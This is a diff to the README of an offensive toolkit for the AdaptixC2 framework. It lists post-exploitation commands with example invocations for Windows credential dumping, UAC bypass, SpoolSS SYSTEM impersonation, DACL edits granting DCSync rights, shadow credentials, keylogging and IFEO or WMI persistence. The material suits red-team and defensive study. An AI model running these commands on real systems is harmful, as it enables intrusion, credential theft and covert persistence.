@@ -1,7 +1,7 @@
 # AdaptixBOFKit
 
 A self-contained [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) extension
-that implements **152 Windows x64 BOFs** (**183 registered commands**, including
+that implements **170 Windows x64 BOFs** (**201 registered commands**, including
 aliases) across the kill chain: situational awareness, network/AD enumeration,
 credential access, Kerberos key derivation and roasting, token manipulation,
 lateral movement, process injection, privilege escalation, defense evasion,
@@ -12,8 +12,8 @@ The BOFs are original, CRT-free C implementations that use Adaptix's
 supported by Adaptix. They are compiled to position-independent x64 COFF
 objects and registered through an AxScript extension.
 
-Coverage is tracked in [`COVERAGE.md`](COVERAGE.md): 147 native, 31 partially
-native, 99 upstream-only (heavy projects such as nanodump, Kerbeus, DCSync,
+Coverage is tracked in [`COVERAGE.md`](COVERAGE.md): 160 native, 41 partially
+native, 84 upstream-only (heavy projects such as nanodump, Kerbeus, DCSync,
 ADCS, CLR hosting, SQL-BOF and BYOVD).
 
 ---
@@ -32,8 +32,11 @@ AdaptixBOFKit/
 │   ├── helpers.h            # CRT-free string/memory/format helpers
 │   ├── sqlite.h             # minimal read-only SQLite reader
 │   ├── tokenhelpers.h       # token name/SID/elevation helpers
-│   └── ldaphelpers.h        # LDAP bind / rootDSE helpers
-├── src/                     # 152 BOF sources (one go() per file)
+│   ├── ldaphelpers.h        # LDAP bind / rootDSE helpers
+│   ├── cryptoh.h            # MD4/SHA/HMAC/PBKDF2/AES helpers
+│   ├── adsd.h               # LDAP security-descriptor / ACE helpers
+│   └── spoolss.h            # SpoolSS coercion helper
+├── src/                     # 170 BOF sources (one go() per file)
 └── _bin/                    # generated: <name>.x64.o
 ```
 
@@ -150,7 +153,7 @@ Extension-Kit.
 | `bof-screenspy` | `bof-screenspy C:\Windows\Temp\shots 5 5` | Repeated desktop captures to numbered BMPs |
 | `bof-keylogger` | `bof-keylogger 30` | Duration-limited low-level keyboard hook, flushed on return |
 | `bof-browserhist` | `bof-browserhist all 50` | Recent Chrome/Edge history from a copied SQLite DB |
-| `bof-findcreds` | `bof-findcreds C:\Users 6` | Recursive credential-file name/content hunt |
+| `bof-findcreds` | `bof-findcreds C:\Users 6 "(password|passwd)\\s*[:=]"` | Recursive filename hunt plus keyword/regex content grep |
 
 ### Network
 
@@ -174,7 +177,7 @@ Extension-Kit.
 | `bof-wmiexec` | `bof-wmiexec DC01 "cmd.exe /c whoami"` | `Win32_Process::Create` over DCOM/WMI |
 | `bof-dcomexec` | `bof-dcomexec DC01 cmd.exe "/c whoami"` | `Shell.Application` DCOM execution |
 | `bof-scshell` | `bof-scshell DC01 Browser "cmd.exe /c whoami"` | Reconfigure an existing service, then restore it |
-| `bof-winrm-exec` | `bof-winrm-exec DC01 "whoami"` | Drives `winrs.exe` and captures stdout through a pipe |
+| `bof-winrm-exec` | `bof-winrm-exec DC01 "whoami"` | Native WS-Man over WinHTTP (Create/Command/Receive/Delete) |
 
 ### AD / accounts
 
@@ -199,6 +202,11 @@ Extension-Kit.
 | `bof-asreproast` | `bof-asreproast` | Find `DONT_REQ_PREAUTH` accounts over LDAP |
 | `bof-gpocheck` | `bof-gpocheck` | GPO links plus GPP `cpassword` decryption from SYSVOL |
 | `bof-trustdump` | `bof-trustdump` | Domain trusts, direction, type, attributes and SID |
+| `bof-dacledit` | `bof-dacledit WS01$ ATTACKER$ dcsync` | Edit an object DACL: `dcsync`, `genericall`, `writeowner`, `remove` |
+| `bof-shadowcred` | `bof-shadowcred WS01$` | Generate/write/remove `msDS-KeyCredentialLink` shadow credentials |
+| `bof-rbcd` | `bof-rbcd WS01$ ATTACKER$` | Set/clear resource-based constrained delegation |
+| `bof-dnsdump` | `bof-dnsdump` | Dump AD-integrated DNS zones over LDAP (A/AAAA/CNAME/MX/TXT/SRV/SOA) |
+| `bof-groupmanagedpw` | `bof-groupmanagedpw svc_sql$` | Read gMSA `msDS-ManagedPassword` and derive the NTLM hash |
 
 ### Credentials / Kerberos
 
@@ -218,8 +226,12 @@ Extension-Kit.
 | `bof-vaultdump` | `bof-vaultdump` | Enumerate Windows Vault containers and item metadata |
 | `bof-dpapiblobdec` | `bof-dpapiblobdec 01000000d08c9ddf...` | Decrypt a hex DPAPI blob in the current user context |
 | `bof-chromecreds` | `bof-chromecreds all` | Chrome/Edge saved logins (legacy DPAPI; modern AES-GCM reported encrypted) |
-| `bof-recentfiles` | `bof-recentfiles` | Recent `.lnk` targets and jump-list inventory |
+| `bof-recentfiles` | `bof-recentfiles` | Recent `.lnk` targets, CFB jump-list streams and DestList paths |
 | `bof-sshagentkeys` | `bof-sshagentkeys` | Public identities and fingerprints from the OpenSSH agent |
+| `bof-lsasecrets` | `bof-lsasecrets` | Enumerate LSA secret slots with `SeBackupPrivilege` |
+| `bof-dpapimasterkey` | `bof-dpapimasterkey <masterkey> <sid> <password>` | Decrypt a user DPAPI masterkey (PBKDF2 + AES-CBC + HMAC) |
+| `bof-vaultdump-full` | `bof-vaultdump-full` | Vault items including `pAuthenticatorElement` secrets |
+| `bof-chromecreds-abe` | `bof-chromecreds-abe all` | Chrome/Edge logins: v10/v11 DPAPI and v20 app-bound keys |
 
 ### Privilege / evasion
 
@@ -242,13 +254,18 @@ Extension-Kit.
 | `bof-stealtoken` | `bof-stealtoken 1234` | Duplicate and impersonate another process token |
 | `bof-reverttoken` | `bof-reverttoken` | Drop thread impersonation |
 | `bof-listimpersonation` | `bof-listimpersonation` | Thread impersonation vs. process primary token |
-| `bof-getsystem-svc` | `bof-getsystem-svc bof_getsystem 30` | Named-pipe impersonation server (coercion half) |
+| `bof-getsystem-svc` | `bof-getsystem-svc bof_getsystem 30 spoolss` | Pipe server with optional SpoolSS self-coercion |
 | `bof-ppidspoof` | `bof-ppidspoof 1234 C:\Windows\System32\cmd.exe` | Spawn with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` |
 | `bof-blockdlls` | `bof-blockdlls C:\Windows\System32\cmd.exe` | Child loads only Microsoft-signed DLLs |
 | `bof-acldeny` | `bof-acldeny file C:\Windows\Temp\payload.exe` | Deny read/execute ACE on a file or registry key |
 | `bof-timestomp` | `bof-timestomp C:\Windows\Temp\payload.exe "2024-01-01 12:00:00"` | Overwrite user-visible timestamps (`copy <src>` supported) |
 | `bof-schtaskshide` | `bof-schtaskshide \Microsoft\Windows\MyTask` | Deny Users read on a task; `restore` to undo |
 | `bof-threadhide` | `bof-threadhide` | `NtSetInformationThread(ThreadHideFromDebugger)` |
+| `bof-uacbypass` | `bof-uacbypass "cmd.exe /c whoami" fodhelper` | HKCU `ms-settings` auto-elevation (`fodhelper`/`computerdefaults`) |
+| `bof-printspoofer` | `bof-printspoofer "cmd.exe /c whoami"` | SpoolSS coercion + named-pipe SYSTEM impersonation |
+| `bof-patchwow64` | `bof-patchwow64 1234` | Restore `wow64cpu.dll` executable sections from the on-disk image |
+| `bof-handlestrip` | `bof-handlestrip` | Close foreign `PROCESS_VM_READ` handles into this process |
+| `bof-aclprotect` | `bof-aclprotect protect` | Set a SYSTEM-only process DACL (`restore` for NULL DACL) |
 
 ### Registry / persistence
 
@@ -274,6 +291,10 @@ Extension-Kit.
 | `bof-addfirewallrule` | `bof-addfirewallrule add AdaptixC2 443 tcp allow` | Add/remove/list firewall rules |
 | `bof-lnkgenerator` | `bof-lnkgenerator C:\Users\Public\Update.lnk C:\Windows\System32\cmd.exe /c calc.exe` | Create a `.lnk` shortcut |
 | `bof-startwebclient` | `bof-startwebclient` | Start the WebClient (WebDAV) service |
+| `bof-wmisubscription` | `bof-wmisubscription Updater "cmd.exe /c calc.exe"` | Permanent WMI filter/consumer/binding (remove supported) |
+| `bof-ifeo` | `bof-ifeo sethc.exe "C:\Windows\System32\cmd.exe"` | Image File Execution Options debugger hijack (`remove`) |
+| `bof-ghost-task` | `bof-ghost-task Updater C:\Windows\System32\cmd.exe /c calc.exe` | Register a task, then deny Users read/execute |
+| `bof-printmonitor` | `bof-printmonitor AcmeMon C:\Windows\Temp\acmemon.dll` | Register a Spooler monitor DLL and restart Spooler |
 
 ### Post-exploitation / utility
 
@@ -297,25 +318,28 @@ Extension-Kit.
 
 ## Coverage
 
-[`COVERAGE.md`](COVERAGE.md) contains a row-by-row coverage map for all **277**
+[`COVERAGE.md`](COVERAGE.md) contains a row-by-row coverage map for all **285**
 rows. The short version:
 
-- **Native (147 rows):** recon, networking, account/AD enumeration, LDAP,
+- **Native (160 rows):** recon, networking, account/AD enumeration, LDAP,
   registry, services, scheduled tasks, VSS, ADCS, WFP, handle introspection,
   credential-manager, DPAPI secret, certificate, clipboard,
   Kerberos ticket/key, injection, hashing, Defender, event log and file
   utilities, COM/trust-provider persistence, firewall rules and shortcuts,
-  token manipulation, lateral execution, process injection, timestomping
-  and task/ACL hiding.
-- **Partially native (31 rows):** `Kerberoast`, `DllEnvHijacking`, `EnumWSC`,
+  token manipulation, lateral execution, process injection, timestomping,
+  ACL editing, gMSA/RBCD/shadow-credential writes, WMI subscriptions, IFEO,
+  print monitors, WOW64 patching, handle stripping and process ACLs.
+- **Partially native (41 rows):** `Kerberoast`, `DllEnvHijacking`, `EnumWSC`,
   `EnumSecProducts`, `SafeHarbor`, `SilenceSysmon`, `GeoLocation_BOF`,
-  `ExecuteCrossSession`, `TrustMeBOF`, `VaultDumpBOF`, WinRM, GPO secret
-  decryption fallbacks, browser credential/history readers, keylogging,
-  LDAP/OSEP suites, etc.
-- **Upstream (99 rows):** LSASS dumping suites (nanodump, PPLDump, WerDump,
-  GhostKatz), Kerberos/Rubeus ports, DCSync, ADCS request/exploit chains, CLR
-  hosting, PoolParty and other injection families, SQL-BOF, BYOVD,
-  clipboard-history thieves and similar multi-file projects.
+  `ExecuteCrossSession`, `TrustMeBOF`, WinRM, GPO secret decryption
+  fallbacks, browser credential/history readers, keylogging, LDAP/OSEP
+  suites, DCSync rights, LSA secrets, DPAPI masterkeys, UAC/SpoolSS
+  coercion, jump-list targets and handle stripping.
+- **Upstream (84 rows):** LSASS dumping suites (nanodump, PPLDump, WerDump,
+  GhostKatz), Kerberos/Rubeus ports, DCSync replication, ADCS
+  request/exploit chains, CLR hosting, PoolParty and other injection
+  families, SQL-BOF, BYOVD, clipboard-history thieves and similar multi-file
+  projects.
 
 For the upstream rows use the **official Adaptix Extension-Kit**, which already
 packages and maintains them for Adaptix:
@@ -410,6 +434,16 @@ cmd_hello.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
   (GUID, task name, rule name, shortcut path) and clean up afterwards.
   `bof-trustme` writes HKLM, is loaded into many processes and should be treated
   as a loud, last-resort persistence test.
+- `bof-dacledit`, `bof-shadowcred`, `bof-rbcd`, `bof-wmisubscription`, `bof-ifeo`,
+  `bof-ghost-task` and `bof-printmonitor` modify AD or host persistence state.
+  Record the object DN, ACE, key, task or monitor name and revert explicitly.
+- `bof-lsasecrets`, `bof-dpapimasterkey`, `bof-vaultdump-full` and
+  `bof-chromecreds-abe` expose plaintext secrets; treat their output as
+  credentials.
+- `bof-uacbypass` and `bof-printspoofer` launch processes at a higher integrity
+  level; `bof-patchwow64`, `bof-handlestrip` and `bof-aclprotect` change live
+  process state and can break the agent or its EDR visibility. Test in a lab
+  and prefer `bof-aclprotect restore` / explicit clean-up.
 - `bof-vssenum` and `bof-wfpenum` usually need admin; `bof-schtaskscreate`/`delete` need
   write access to the target task folder. `bof-addlocalcert machine` needs admin.
 - `bof-evtxsearch` renders up to 200 events per call; large XPath queries can be
